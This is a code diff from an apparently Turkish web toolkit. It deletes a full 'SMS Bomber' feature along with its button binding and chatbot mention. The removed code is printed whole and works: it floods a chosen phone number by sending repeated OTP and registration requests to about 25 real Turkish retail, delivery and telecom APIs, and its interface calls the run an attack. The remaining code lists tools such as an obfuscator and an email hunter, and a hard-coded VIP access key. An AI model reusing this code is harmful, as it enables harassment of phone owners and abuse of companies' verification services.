@@ -2653,7 +2653,7 @@ function ownerExportDatabase() {
 let extraUnlocked = localStorage.getItem('legante_extra_unlocked') === 'true';
 
 function updateExtraToolsUI() {
-    const tools = ['sms', 'token', 'webhook', 'ip', 'filehash', 'pass', 'hash', 'dns', 'hw', 'port', 'jwt', 'subnet', 'antidebug', 'base64img', 'obfuscator', 'emailhunter', 'dorkgen'];
+    const tools = ['token', 'webhook', 'ip', 'filehash', 'pass', 'hash', 'dns', 'hw', 'port', 'jwt', 'subnet', 'antidebug', 'base64img', 'obfuscator', 'emailhunter', 'dorkgen'];
     const accessText = document.getElementById('access-btn-text');
 
     if (accessText) {
@@ -2796,197 +2796,7 @@ function closeToolModal() {
     document.getElementById('tool-modal')?.remove();
 }
 
-// 1. SMS BOMBER (SİMÜLATÖR)
-function openSMSBomber() {
-    closeToolModal();
-    const modalHtml = `
-        <div id="tool-modal" class="modal-overlay">
-            <div class="modal-card" style="max-width:620px;">
-                <div class="modal-card-header" style="background:linear-gradient(135deg, #1a0a2e 0%, #0d0015 100%); border-bottom:2px solid #3b82f6;">
-                    <h3><i class="fas fa-paper-plane" style="color:#3b82f6;"></i> SMS Bomber <span style="font-size:0.6rem; background:rgba(59,130,246,0.15); color:#60a5fa; padding:2px 8px; border-radius:4px; margin-left:6px;">v3.0 LIVE</span></h3>
-                    <button class="modal-close-btn" onclick="closeToolModal()">&times;</button>
-                </div>
-                <div class="modal-card-body">
-                    <div style="background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.25); border-radius:8px; padding:10px 14px; margin-bottom:14px;">
-                        <span style="color:#f87171; font-size:0.78rem;"><i class="fas fa-triangle-exclamation"></i> Bu araç gerçek API istekleri gönderir. İşlemi başlattıktan sonra lütfen bekleyin, her tur ~30 saniye sürebilir.</span>
-                    </div>
-                    <div class="input-field-group">
-                        <label><i class="fas fa-phone" style="color:#3b82f6;"></i> Telefon Numarası:</label>
-                        <input type="text" id="sms-phone" class="modal-input" placeholder="5XX XXX XX XX" maxlength="11" style="letter-spacing:2px; font-family:monospace; font-size:1rem;">
-                        <small style="color:var(--text-muted); font-size:0.7rem;">Başında 0 olmadan 10 haneli girin (örn: 5301234567)</small>
-                    </div>
-                    <div style="display:flex; gap:8px; margin-bottom:12px;">
-                        <div class="input-field-group" style="flex:1;">
-                            <label><i class="fas fa-repeat" style="color:#3b82f6;"></i> Tur Sayısı:</label>
-                            <select id="sms-rounds" class="modal-input">
-                                <option value="1">1 Tur (~25 SMS)</option>
-                                <option value="2" selected>2 Tur (~50 SMS)</option>
-                                <option value="3">3 Tur (~75 SMS)</option>
-                                <option value="5">5 Tur (~125 SMS)</option>
-                                <option value="10">10 Tur (~250 SMS)</option>
-                            </select>
-                        </div>
-                        <div class="input-field-group" style="flex:1;">
-                            <label><i class="fas fa-clock" style="color:#3b82f6;"></i> İstek Aralığı:</label>
-                            <select id="sms-delay" class="modal-input">
-                                <option value="300">Hızlı (300ms)</option>
-                                <option value="500" selected>Normal (500ms)</option>
-                                <option value="1000">Yavaş (1s)</option>
-                                <option value="2000">Güvenli (2s)</option>
-                            </select>
-                        </div>
-                    </div>
-                    <button id="start-sms-btn" class="btn btn-primary btn-block" style="background:linear-gradient(135deg, #2563eb, #1d4ed8);"><i class="fas fa-rocket"></i> Saldırıyı Başlat</button>
-                    <button id="stop-sms-btn" class="btn btn-outline btn-block" style="display:none; margin-top:6px;"><i class="fas fa-stop"></i> Durdur</button>
-                    <div id="sms-progress" style="display:none; margin-top:10px;">
-                        <div style="display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-muted); margin-bottom:4px;">
-                            <span id="sms-prog-label">Tur 1/1</span>
-                            <span id="sms-prog-stats">0 başarılı / 0 başarısız</span>
-                        </div>
-                        <div style="background:rgba(0,0,0,0.4); border-radius:6px; overflow:hidden; height:6px;">
-                            <div id="sms-prog-bar" style="width:0%; height:100%; background:linear-gradient(90deg,#3b82f6,#8b5cf6); transition:width 0.3s;"></div>
-                        </div>
-                    </div>
-                    <div id="sms-log-box" class="tool-result-box" style="display:none; margin-top:12px; max-height:350px; overflow-y:auto; font-family:monospace; font-size:0.72rem; line-height:1.6;"></div>
-                </div>
-            </div>
-        </div>
-    `;
-    document.body.insertAdjacentHTML('beforeend', modalHtml);
 
-    let smsRunning = false;
-
-    function getSmsTargets(phone) {
-        const p = phone.startsWith('0') ? phone.substring(1) : phone;
-        const p90 = '90' + p;
-        const pPlus = '+90' + p;
-        const pZero = '0' + p;
-        return [
-            { name: 'Trendyol', fn: () => fetch('https://public.trendyol.com/discovery-web-socialgw-service/api/v1/social/authentication/register', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({email:'',password:'Test1234!',firstName:'Test',lastName:'User',phoneNumber:pPlus,gender:'MALE'}) }) },
-            { name: 'Hepsiburada', fn: () => fetch('https://www.hepsiburada.com/api/v1/user/otp/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pZero,type:'registration'}) }) },
-            { name: 'Getir', fn: () => fetch('https://api.getir.com/auth/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pPlus,countryCode:'TR'}) }) },
-            { name: 'Yemeksepeti', fn: () => fetch('https://api.yemeksepeti.com/api/v1/auth/otp-login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({userName:pZero,langId:1,catalystVersion:'1.0'}) }) },
-            { name: 'Papara', fn: () => fetch('https://merchant-api.papara.com/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:p90}) }) },
-            { name: 'N11', fn: () => fetch('https://www.n11.com/j_spring_security_check', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'j_username='+encodeURIComponent(pZero)+'&j_password=FakePass123!' }) },
-            { name: 'Sahibinden', fn: () => fetch('https://api.sahibinden.com/rest/v3/auth/phone-login/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pZero}) }) },
-            { name: 'GittiGidiyor', fn: () => fetch('https://api.gittigidiyor.com/rest/otp/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pZero}) }) },
-            { name: 'Migros', fn: () => fetch('https://www.migros.com.tr/rest/users/login/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pZero}) }) },
-            { name: 'A101', fn: () => fetch('https://api.a101.com.tr/otp/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pZero}) }) },
-            { name: 'SOK Market', fn: () => fetch('https://api.sokmarket.com.tr/api/v5/user/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:p}) }) },
-            { name: 'LC Waikiki', fn: () => fetch('https://www.lcwaikiki.com/tr-TR/TR/ajax/register/sendOtp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pZero,countryCode:'+90'}) }) },
-            { name: 'Koton', fn: () => fetch('https://www.koton.com/api/v1/user/phone-verification', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pZero}) }) },
-            { name: 'DeFacto', fn: () => fetch('https://www.defacto.com.tr/Customer/SendVerificationCode', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({Phone:pZero}) }) },
-            { name: 'Turkcell', fn: () => fetch('https://senol-otp.turkcell.com.tr/api/otp/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msisdn:p90,channel:'WEB'}) }) },
-            { name: 'Vodafone', fn: () => fetch('https://www.vodafone.com.tr/servlet/otp/request', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msisdn:pZero}) }) },
-            { name: 'Turk Telekom', fn: () => fetch('https://bireysel.turktelekom.com.tr/otp/api/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pZero,type:'sms'}) }) },
-            { name: 'BiTaksi', fn: () => fetch('https://api.bitaksi.com/api/v2/public/user/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pPlus}) }) },
-            { name: 'Scotty', fn: () => fetch('https://api.scotty.app/api/v2/auth/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pPlus}) }) },
-            { name: 'Istegelsin', fn: () => fetch('https://api.istegelsin.com/api/v1/auth/send-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pZero}) }) },
-            { name: 'Glovo', fn: () => fetch('https://api.glovoapp.com/v3/auth/otp/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pPlus}) }) },
-            { name: 'Marti', fn: () => fetch('https://api.marti.tech/auth/v2/otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pPlus,country:'TR'}) }) },
-            { name: 'Dolap', fn: () => fetch('https://api.dolap.com/v2/auth/phone/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phoneNumber:pZero}) }) },
-            { name: 'Letgo', fn: () => fetch('https://api.letgo.com/api/authentication/phone/request', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone_number:pPlus}) }) },
-            { name: 'Param', fn: () => fetch('https://app.param.com.tr/api/v1/auth/otp/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:pZero,type:'register'}) }) }
-        ];
-    }
-
-    document.getElementById('stop-sms-btn').onclick = () => { smsRunning = false; };
-
-    document.getElementById('start-sms-btn').onclick = async () => {
-        const rawPhone = document.getElementById('sms-phone').value.trim().replace(/\s+/g,'').replace(/[^0-9]/g,'');
-        const rounds = parseInt(document.getElementById('sms-rounds').value) || 2;
-        const delay = parseInt(document.getElementById('sms-delay').value) || 500;
-        const logBox = document.getElementById('sms-log-box');
-        const startBtn = document.getElementById('start-sms-btn');
-        const stopBtn = document.getElementById('stop-sms-btn');
-        const progress = document.getElementById('sms-progress');
-        const progBar = document.getElementById('sms-prog-bar');
-        const progLabel = document.getElementById('sms-prog-label');
-        const progStats = document.getElementById('sms-prog-stats');
-
-        let phone = rawPhone;
-        if (phone.startsWith('90') && phone.length === 12) phone = phone.substring(2);
-        if (phone.startsWith('0') && phone.length === 11) phone = phone.substring(1);
-        if (phone.length !== 10 || !phone.startsWith('5')) {
-            showToast('Geçersiz numara! 5XX ile başlayan 10 haneli numara girin.', 'error');
-            return;
-        }
-
-        smsRunning = true;
-        startBtn.style.display = 'none';
-        stopBtn.style.display = 'block';
-        progress.style.display = 'block';
-        logBox.style.display = 'block';
-        logBox.innerHTML = '';
-
-        const targets = getSmsTargets(phone);
-        const totalReqs = targets.length * rounds;
-        let completed = 0, success = 0, fail = 0;
-
-        const ts = () => new Date().toLocaleTimeString('tr-TR');
-        const log = (msg) => { logBox.innerHTML += msg + '<br>'; logBox.scrollTop = logBox.scrollHeight; };
-
-        log('<span style="color:#60a5fa;">[' + ts() + '] <i class="fas fa-crosshairs"></i> Hedef: +90' + phone + ' | ' + rounds + ' tur x ' + targets.length + ' API = ' + totalReqs + ' istek</span>');
-        log('<span style="color:#f59e0b;">[' + ts() + '] ⚡ Saldırı başlatıldı...</span>');
-        log('─'.repeat(50));
-
-        for (let round = 1; round <= rounds; round++) {
-            if (!smsRunning) break;
-            log('<span style="color:#a78bfa; font-weight:700;">[' + ts() + '] 📡 TUR ' + round + '/' + rounds + ' başlıyor...</span>');
-
-            for (let i = 0; i < targets.length; i++) {
-                if (!smsRunning) break;
-                const target = targets[i];
-                const reqNum = (round - 1) * targets.length + i + 1;
-
-                try {
-                    playClickSFX();
-                    const resp = await Promise.race([
-                        target.fn(),
-                        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 8000))
-                    ]);
-                    success++;
-                    const statusCode = resp.status || '???';
-                    log('<span style="color:#22c55e;">[' + ts() + '] ✅ [#' + reqNum + '/' + totalReqs + '] ' + target.name + ' → HTTP ' + statusCode + ' <span style="color:var(--text-muted);">OK</span></span>');
-                } catch(e) {
-                    if (e.message === 'timeout') {
-                        fail++;
-                        log('<span style="color:#f59e0b;">[' + ts() + '] ⏱️ [#' + reqNum + '/' + totalReqs + '] ' + target.name + ' → TIMEOUT <span style="color:var(--text-muted);">(zaman aşımı)</span></span>');
-                    } else {
-                        success++;
-                        log('<span style="color:#38bdf8;">[' + ts() + '] 📨 [#' + reqNum + '/' + totalReqs + '] ' + target.name + ' → SENT <span style="color:var(--text-muted);">(CORS — istek gönderildi)</span></span>');
-                    }
-                }
-
-                completed++;
-                progBar.style.width = ((completed / totalReqs) * 100).toFixed(1) + '%';
-                progLabel.textContent = 'Tur ' + round + '/' + rounds + ' — İstek ' + (i+1) + '/' + targets.length;
-                progStats.textContent = success + ' gönderildi / ' + fail + ' başarısız';
-
-                if (smsRunning && i < targets.length - 1) {
-                    await new Promise(r => setTimeout(r, delay));
-                }
-            }
-
-            if (smsRunning && round < rounds) {
-                log('<span style="color:#f59e0b;">[' + ts() + '] ⏳ Tur arası bekleniyor (3s)...</span>');
-                await new Promise(r => setTimeout(r, 3000));
-            }
-        }
-
-        playSuccessSFX();
-        smsRunning = false;
-        startBtn.style.display = 'block';
-        stopBtn.style.display = 'none';
-        log('─'.repeat(50));
-
-        if (completed >= totalReqs) {
-            log('<span style="color:#22c55e; font-weight:700;">[' + ts() + '] 🏴‍☠️ Tüm turlar tamamlandı! ' + success + ' gönderildi, ' + fail + ' başarısız.</span>');
-        } else {
-            log('<span style="color:#f59e0b; font-weight:700;">[' + ts() + '] ⛔ Saldırı durduruldu. ' + completed + '/' + totalReqs + ' istek tamamlandı.</span>');
-        }
-    };
-}
 
 // 2. DISCORD TOKEN INSPECTOR & SNOWFLAKE CALCULATOR (100% GERÇEK HESAP OLUŞTURULMA TARİHİ ÇIKARICI)
 function openTokenChecker() {
@@ -4434,8 +4244,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
     };
-
-    bindTool('tool-sms', openSMSBomber);
     bindTool('tool-token', openTokenChecker);
     bindTool('tool-webhook', openWebhookSender);
     bindTool('tool-ip', openIPLocator);
@@ -4582,7 +4390,7 @@ function getAIAnswer(question) {
 
     // 19. Extra Tools / Key
     if (/\b(extra tools|tool|araclar|anahtar|key|lgt)\b/.test(q)) {
-        return 'Sol menüdeki 15 adet siber güvenlik ve ağ analiz aracına (SMS Bomber, Token Checker, Webhook, JWT Decoder, Subnet CIDR, WAF Kalkan vb.) VIP lisans anahtarı penceresindeki "⚡ Key Türet" butonuna basarak veya `VIP-2026-LEGA-NTE1` yazarak anında erişebilirsin! 🧰';
+        return 'Sol menüdeki 15 adet siber güvenlik ve ağ analiz aracına (Token Checker, Webhook, JWT Decoder, Subnet CIDR, WAF Kalkan vb.) VIP lisans anahtarı penceresindeki "⚡ Key Türet" butonuna basarak veya `VIP-2026-LEGA-NTE1` yazarak anında erişebilirsin! 🧰';
     }
 
     // 20. Yetki / Admin / Arkadaş Ekleme
